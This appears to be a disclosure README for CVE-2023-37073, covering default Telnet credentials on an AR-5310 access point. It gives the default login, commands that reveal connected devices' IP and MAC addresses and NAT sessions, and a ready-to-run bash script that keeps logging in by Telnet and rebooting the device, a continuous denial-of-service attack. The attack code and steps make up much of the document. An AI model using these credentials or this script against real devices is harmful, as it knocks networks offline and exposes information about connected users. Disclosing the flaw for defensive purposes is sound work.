
# CVE-2023-37073

Telnet default credentials can lead to information disclosure and denial-of-service (DoS) attacks.



## Steps To reporduce

This affect the AP AR-5310
```bash
  Telnet 192.168.1.1
  username:user
  password:user
  Then Boom ... You logged in 
```


## Information disclosure through Telnet default credentials
```bash
    When you log in using Telnet service, 
    type the command 'help' or '?' to view    
    available options:
    
    > reboot, ping, lanhosts, passwd
  
    > restoredefault, nslookup, traceroute
  
    > save, uptime, exitOnIdle, wan, version,
  
    > serialnumber, modelname, tr69cfg, nat

```
```bash
  To obtain the IP and MAC address of each device 
  connected to the network, run the command  
  'lanhosts'.
  To display all NAT sessions through the Access  
  Point (AP), 
  use the command 'nat show session'
```
## Dos attack 
```bash
  To execute a Denial of Service (DoS) attack, 
  run the command 'reboot' to restart the AP. 
  I want to automate a script that will 
  consistently restart the AP.

```
## Automate Dos attack through script shell
```bash
#!/bin/bash

# Telnet credentials
USER="user"
PASSWORD="user"
HOST="192.168.1.1"

# Function to check host availability
check_host_availability() {
    ping -c 1 -W 1 "$HOST" > /dev/null 2>&1
    return $?
}

# Loop to check host availability and execute Telnet command when available
while true; do
    if check_host_availability; then
        echo "Host $HOST is reachable. Initiating Telnet connection and reboot..."
        { sleep 1; echo "$USER"; sleep 1; echo "$PASSWORD"; sleep 1; echo "reboot"; sleep 1; } | telnet "$HOST"
    else
        echo "Host $HOST is not reachable. Retrying in 10 seconds..."
        sleep 10
    fi
done
```
